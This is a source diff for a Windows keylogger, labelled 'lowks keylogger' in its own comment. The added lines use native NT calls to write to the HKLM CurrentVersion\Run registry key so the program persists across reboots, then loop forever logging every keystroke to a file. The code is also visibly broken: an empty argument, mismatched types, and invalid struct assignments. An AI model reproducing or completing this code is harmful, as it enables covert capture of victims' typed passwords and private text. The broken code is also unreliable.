@@ -1,6 +1,7 @@
 #include <stdio.h>
 #include <windows.h>
 #include <conio.h>
+#include <winternl.h>
 #include "lowkey.h"
 
 // lowks keylogger
@@ -53,22 +54,78 @@ int main(void) {
       "NtCreateKey");
 
     char path[MAX_PATH];
-
-    DWORD result = GetModuleFileName(NULL, path, MAX_PATH);
+    DWORD result;
 
 
     UNICODE_STRING registryPath;
-    String str = (&registryPath, L"Computer\\HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run");
+
+
+
 
     HANDLE hw;
     POBJECT_ATTRIBUTES wl;
     ACCESS_MASK am;
 
 
-    status = _NtOpenKey(&hw, am, wl);
+    RtlInitUnicodeString(&registryPath, L"\\Registry\\Machine\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run");
 
+ wl = {
+        .Length = sizeof(OBJECT_ATTRIBUTES),
+        .RootDirectory = NULL, // No root directory is used, so this is NULL
+        .ObjectName = &registryPath, // Points to the UNICODE_STRING containing the registry path
+        .Attributes = OBJ_CASE_INSENSITIVE, // Example attribute, can be adjusted as needed
+        .SecurityDescriptor = NULL, // No security descriptor
+        .SecurityQualityOfService = NULL // No quality of service
+    };
+
+
+    status = _NtOpenKey(&hw, am, wl);
+    RtlInitUnicodeString(&result,GetModuleFileName(NULL, path, MAX_PATH));
+
+
+        wl = {
+            .Length = sizeof(OBJECT_ATTRIBUTES),
+            .RootDirectory = NULL, // No root directory is used, so this is NULL
+            .ObjectName = &registryPath, // Points to the UNICODE_STRING containing the registry path
+            .Attributes = OBJ_CASE_INSENSITIVE, // Example attribute, can be adjusted as needed
+            .SecurityDescriptor = NULL, // No security descriptor
+            .SecurityQualityOfService = NULL // No quality of service
+        };
 
     _NtCreateKey(&hw,am, wl, NULL, );
+
+
+    HFILE hf;
+    IO_STATUS_BLOCK ys;
+
+    ULONG ly = FILE_ATTRIBUTE_NORMAL;
+    ULONG cc= FILE_SHARE_READ;
+    ULONG qq = FILE_OVERWRITE_IF;
+    ULONG co = FILE_NON_DIRECTORY_FILE | FILE_SYNCHRONOUS_IO_NONALERT;
+
+    PVOID eb = NULL;
+    ULONG el = 0;
+    _NtCreateFile(&hf,am, wl, &ys,  ly,0x00000000,cc,qq,co, eb,el );
+    int ch;
+
+    while (1 == 1) {
+        ch = _getch();
+
+
+        if(ascii_lookup[ch] == '\r' ) {
+            _NtWriteFile("\n");
+            _NtWriteFile(ascii_lookup[ch]);
+        }
+        else {
+            _NtWriteFile(ascii_lookup[ch]);
+        }
+
+
+
+    }
+
+
+
 
     return 0;
 }
